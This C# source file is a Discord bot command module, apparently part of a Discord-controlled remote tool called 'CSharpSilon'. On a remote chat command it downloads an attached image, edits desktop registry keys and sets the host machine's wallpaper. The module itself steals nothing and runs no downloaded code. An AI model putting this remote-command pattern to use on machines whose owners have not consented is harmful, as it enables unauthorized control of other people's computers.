using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using Discord.Commands;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace CSharpSilon.cmds
{
    public class Wallpaper : ModuleBase<SocketCommandContext>
    {
        
        [DllImport("user32.dll")]
        public static extern uint SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);
        
        public static readonly uint SPIF_SENDWININICHANGE = 2U;
        public static readonly uint SPIF_UPDATEINIFILE = 1U;
        public static readonly uint SPI_SETDESKWALLPAPER = 20U;
        
        [Command("wallpaper"), Alias("wp"), Summary("Changes The User's ")]
        public async Task Wp()
        {
            if (Context.Message.Attachments.Count == 0) await ReplyAsync("Please Upload `1` Image");
            if (Context.Message.Attachments.Count > 1) await ReplyAsync("Please Upload Only `1` Image");

            var atch = Context.Message.Attachments.FirstOrDefault();
            if (atch == null)
            {
                await ReplyAsync("Image Was Null.");
                return;
            }
            Change(new WebClient().DownloadData(atch.Url));
            await ReplyAsync("Wallpaper Change Successful.");
        }
        
        public void Change(byte[] img)
        {
            string text = Path.Combine(new string[] { Path.GetTempFileName() + ".png" });
            string text2 = Path.Combine(new string[] { Path.GetTempFileName() + ".png" });
            File.WriteAllBytes(text, img);
            using (Bitmap bitmap = new Bitmap(text))
            {
                using (Graphics.FromImage(bitmap))
                {
                    bitmap.Save(text2, ImageFormat.Bmp);
                }
            }
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true))
            {
                registryKey.SetValue("WallpaperStyle", 2.ToString());
                registryKey.SetValue("TileWallpaper", 0.ToString());
            }
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0U, text2, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}